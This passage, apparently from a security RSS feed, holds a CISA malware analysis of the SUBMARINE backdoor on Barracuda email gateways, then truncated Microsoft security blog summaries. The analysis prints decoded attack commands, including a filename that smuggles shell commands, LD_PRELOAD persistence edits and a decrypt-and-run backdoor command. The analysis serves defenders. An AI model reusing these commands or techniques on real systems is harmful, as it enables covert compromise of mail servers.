			For information about related malware, specifically information on the initial exploit payload and other backdoors, see CISA Alert: &lt;a href="https://www.cisa.gov/news-events/alerts/2023/07/28/cisa-releases-malware-analysis-reports-barracuda-backdoors"&gt;CISA Releases Malware Analysis Reports on Barracuda Backdoors&lt;/a&gt;.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'config.TRG' is a SUBMARINE artifact. The presence of the filename, 'config.TRG' does not indicate that the ESG is infected. Instead, it is the actual contents of the file that determine whether it is infected or not. The contents of 'config.TRG' is contained within the SQL database file called 'config.snapshot' and the MIME attachments. Presence of the contents of the file 'config.TRG' within the SQL database is indicative of an infection of SUBMARINE.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a malicious SQL trigger called ‘cuda_trigger’ (Figure 1). This SQL trigger is set to run as root on the local host before a row is deleted from the database. After the trigger parameters are met, two actions occur. First a compressed, base64 encoded blob containing 2 files is written into a file called ‘r’ in the ‘/var/tmp’ directory (Figure 2). Second, a base64 encoded command is executed (Figure 3).&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;BSMTP_ID&amp;gt; &amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;
			rm -f /root/machine\` *chmod +x /root/mac*&lt;br /&gt;&lt;br /&gt;
			sh /root/mach*\`*&lt;br /&gt;&lt;br /&gt;
			--End Base64 Decoded Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The commands will decode the base64 encoded string and execute the decoded result as a shell command. The commands will pass the contents of the file 'r' to be decoded then decompressed with the 'tar' command. Then, the file 'run.sh' executes with the 'nohup' parameter. The 'nohup' parameter allows the process launched on the shell to continue executing even if the shell is closed. The 'BSMTP_ID' is passed and all errors redirected and discarded to the '/dev/null' directory. Lastly, the contents of the '/root/machine' directory will be removed, permissions are set to executable, and shell scripts containing a name with the string 'mach*' in the root directory are executed.&lt;/p&gt;

&lt;p&gt;The file 'machineecho -n Y2htb2QgK3ggL3Jvb3QvbWFjKgpzaCAvcm9vdC9tYWNoKlxgKgoK _ base64 -d _sh`_' is a SUBMARINE artifact. The file is a shell script identified in the '/root' directory and contains base64 encoded commands. The name of the file is designed to exploit a vulnerability on the target environment where the base64 string within the file name will be executed on the Linux shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;
			chmod +x /root/mac*&lt;br /&gt;&lt;br /&gt;
			sh /root/mach*\`*&lt;br /&gt;&lt;br /&gt;
			--End Base64 Decoded Name/Command--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The above commands will change the permissions of the directory, '/root/mac*', to executable.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file contains a series of operations, such as decoding a base64 encoded string and executing the decoded result as a shell command. The decoded base64 string represents a series of commands that will be executed by the shell.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin Base64 Decoded Command~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			cat /var/tmp/r | base64 -d -i | tar -zx -C /var/tmp&lt;br /&gt;&lt;br /&gt;
			nohup bash /var/tmp/run.sh &amp;lt;REDACTED BSMTP_ID&amp;gt; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;gt;/dev/null 2&amp;gt;&amp;amp;1 &amp;amp;&lt;br /&gt;&lt;br /&gt;
			rm -f /root/machine\`*&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~End Base64 Decoded Command~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This command is identical to the decoded base64 commands found in the SQL trigger identified in the file 'config.snapshot'.&lt;/p&gt;

&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'run.sh' is a SUBMARINE loader. The file is a shell script located at within the archive 'r' in the '/var/tmp' directory. The purpose of 'run.sh' is to perform a combination of file manipulation, script generation and execution (Figure 4). There are 4 variables within 'run.sh':&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--Begin Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			B1=$1&lt;br /&gt;&lt;br /&gt;
			F="/boot/os_tools/hw-set"&lt;br /&gt;&lt;br /&gt;
			S="/home/product/code/firmware/current/sbin/smtpctl"&lt;br /&gt;&lt;br /&gt;
			A="/boot/os_tools/libutil.so"&lt;br /&gt;&lt;br /&gt;
			B=`echo -n "sed -i \"s|exec|BSMTP_ID=$B1 LD_PRELOAD=$A exec|g\" $S"|base64 -w0`&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			--End Variable List--&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The script begins by moving SUBMARINE from the '/var/tmp/' directory to the '/boot/os_tools/' directory for persistence.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The variable "B" is declared as a 'sed' command that replaces all occurrences of the string 'exec' with `BSMTP_ID=$1 LD_PRELOAD=/boot/os_tools/libutil.so exec /home/product/code/firmware/current/sbin/smtpctl'. This 'sed' command is then base64 encoded.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			A new file called 'hw-set' is created in the '/boot/os_tools/' directory. A line is appended to the 'smtpctl' file which checks for the string 'LD_PRELOAD'. If the string is not found, the base64 encoded string stored in variable "B" is decoded and executed as a shell command and 'smtpctl' is restarted.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'chmod' command is used to set executable permissions for 'hw-set'.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The 'sed' command is used with a '-i' flag to modify the file 'update_version' within the '/boot/os_tools/' directory with an appended string to line 44. The appended string, "system('/boot/os_tools/hw-set 2&amp;gt;&amp;amp;1 &amp;gt;/dev/null &amp;amp;');", will run the file 'hw-set' in the background and redirect both output and errors to 'dev/null' whenever the file 'update_version' is executed.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The file 'hw-set' is executed and the 'sed' command with the '-i' flag is used to insert the string 'sleep 2m' on line 1 to set a sleep duration of 2 minutes.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Finally, all files and directories within '/var/tmp/' directory are removed.&lt;/p&gt;

&lt;p&gt;The file 'hw-set' is a SUBMARINE artifact. The file is a shell script located in the '/boot/os_tools/' directory and contains shell commands as well as a base64 encoded string (Figure 5). The shell script is set to sleep for 2 minutes prior to execution. The 'grep' command checks if the string 'LD_PRELOAD' is contained within the 'smtpctl' file located at '/home/product/code/firmware/current/sbin/'. The exclamation point (!) prepending the script is used to check for success or failure of the 'grep' command. If the string 'LD_PRELOAD' is not identified, a base64 encoded 'sed' command is used to modify the 'smtpctl' file (Figure 6).&lt;/p&gt;

&lt;p&gt;The file 'smtpctl' is a SUBMARINE loader. The file is a maliciously modified shell script used to remove mail files in 2 directories as well as load SUBMARINE as a shared library for the Batched Simple Mail Transfer Protocol (BSMTP) daemon.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			~Begin File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			rm -f /mail/scan/body*&lt;br /&gt;&lt;br /&gt;
			rm -f /mail/tmp/mimeattach.*&lt;br /&gt;&lt;br /&gt;
			~End File Removal Commands~&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Appended malicious code at the bottom of 'smtpctl.sh' sets the BSMTP_ID and SUBMARINE is preloaded as a shared library from the '/boot/os_tools' directory. It then executes the BSMTP daemon. If the BSMTPD_PID variable is set, debug mode is enabled. If the BSMTPD_PID variable is not set, execution continues without enabling debug mode. Additionally, any instances of the string 'reload' in the command are replaced with 'restart' and all errors are redirected to '/dev/null' (Figure 7).&lt;/p&gt;

&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h5&gt;Description&lt;/h5&gt;
&lt;p&gt;The file 'libutil.so' is the SUBMARINE payload. 'libutil.so' is preloaded into the BSMTP daemon, the Linux executable responsible for receiving emails, and processing Simple Mail Transfer Protocol (SMTP) reply messages. Linux Shared Object Preloading is analogous to Dynamic-Link Library (DLL) side loading and DLL injection in the Windows OS.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			This file is preloaded using the 'LD_PRELOAD' parameter, applied to 'bsmtpd', the BSMTP daemon executable. The preload parameter is added to two configuration files, files that control the behavior of 'bsmtpd.' When the configuration files restart the daemon, 'libutil.so' is loaded into its process memory, giving it the same privileges and access as 'bsmtpd.'&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			The malware obtains the BSMTP_ID environment variable from the infected system. The BSMTP_ID has the capacity to be used as a port for malicious traffic. (Figure 8). The process this shared object file is running in, 'bsmtpd', is duplicated and launched using the 'fork' Linux function (Figure 9). The malware opens a connection to 127.0.0.1 on the victim machine it is running on (Figure 10). The 'recv' function is called after the connection is opened, showing that the malware has the capacity to obtain information from the context/environment its executed on.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 11, Pane 1, shows configuration settings for the BSMTP daemon, that allows any email traffic for the address range of 127/8 and multiple actions including 'ehlo.' Pane 2 shows the malware intaking data, and loading the 'ehlo' action into memory.&lt;br /&gt;&lt;br /&gt;
			&lt;br /&gt;&lt;br /&gt;
			Figure 12, Pane 1, shows the malware, in conjunction with 'snprintf_chk', printing the string 'echo -n '%s' | base64 -d | openssl aes-256-cbc -d -K 66833b26%d -iv 69822b6c%d 2&amp;gt;/dev/null | sh', to the Linux shell. The string is a command that accepts input '%s', decodes it with Base64, decrypts it with AES, pipes errors to std_out and executes it on the target with the 'sh' bash command and 'system' Linux function. Lastly, the malware has the capacity to print the SMTP string, '250-mail2.eccentric.duck Hello %s [%s], pleased to meet you' . Therefore, given this information, the malware has the capacity to accept encoded and encrypted inputs from 'bsmtpd', execute them, and print a message.&lt;/p&gt;

&lt;h3&gt;Recommendations&lt;/h3&gt;
&lt;p&gt;CISA recommends that users and administrators consider using the following best practices to strengthen the security posture of their organization's systems. Any configuration changes should be reviewed by system owners and administrators prior to implementation to avoid unwanted impacts.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Maintain up-to-date antivirus signatures and engines.&lt;/li&gt;
&lt;li&gt;Keep operating system patches up-to-date.&lt;/li&gt;
&lt;li&gt;Disable File and Printer sharing services. If these services are required, use strong passwords or Active Directory authentication.&lt;/li&gt;
&lt;li&gt;Restrict users' ability (permissions) to install and run unwanted software applications. Do not add users to the local administrators group unless required.&lt;/li&gt;
&lt;li&gt;Enforce a strong password policy and implement regular password changes.&lt;/li&gt;
&lt;li&gt;Exercise caution when opening e-mail attachments even if the attachment is expected and the sender appears to be known.&lt;/li&gt;
&lt;li&gt;Enable a personal firewall on agency workstations, configured to deny unsolicited connection requests.&lt;/li&gt;
&lt;li&gt;Disable unnecessary services on agency workstations and servers.&lt;/li&gt;
&lt;li&gt;Scan for and remove suspicious e-mail attachments; ensure the scanned attachment is its "true file type" (i.e., the extension matches the file header).&lt;/li&gt;
&lt;li&gt;Monitor users' web browsing habits; restrict access to sites with unfavorable content.&lt;/li&gt;
&lt;li&gt;Exercise caution when using removable media (e.g., USB thumb drives, external drives, CDs, etc.).&lt;/li&gt;
&lt;li&gt;Scan all software downloaded from the Internet prior to executing.&lt;/li&gt;
&lt;li&gt;Maintain situational awareness of the latest threats and implement appropriate Access Control Lists (ACLs).&lt;/li&gt;
&lt;/ul&gt;

An attacker can falsify the email claim in tokens issued to applications.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2023/06/potential-risk-of-privilege-escalation-in-azure-ad-applications/</guid></item><item><title>Microsoft Response to Layer 7 Distributed Denial of Service (DDoS) Attacks</title><link>https://msrc.microsoft.com/blog/2023/06/microsoft-response-to-layer-7-distributed-denial-of-service-ddos-attacks/</link><description>Summary Beginning in early June 2023, Microsoft identified surges in traffic against some services that temporarily impacted availability. Microsoft promptly opened an investigation and subsequently began tracking ongoing DDoS activity by the threat actor that Microsoft tracks as Storm-1359.
These attacks likely rely on access to multiple virtual private servers (VPS) in conjunction with rented cloud infrastructure, open proxies, and DDoS tools.</description><guid isPermaLink="false">https://msrc.microsoft.com/blog/2023/06/microsoft-response-to-layer-7-distributed-denial-of-service-ddos-attacks/</guid></item><item><title>Microsoft mitigates set of cross-site scripting (XSS) vulnerabilities in Azure Bastion and Azure Container Registry</title><link>https://msrc.microsoft.com/blog/2023/06/microsoft-mitigates-set-of-cross-site-scripting-xss-vulnerabilities-in-azure-bastion-and-azure-container-registry/</link><description>Summary Microsoft recently mitigated a set of cross-site scripting vulnerabilities affecting Azure Bastion and Azure Container Registry (ACR).
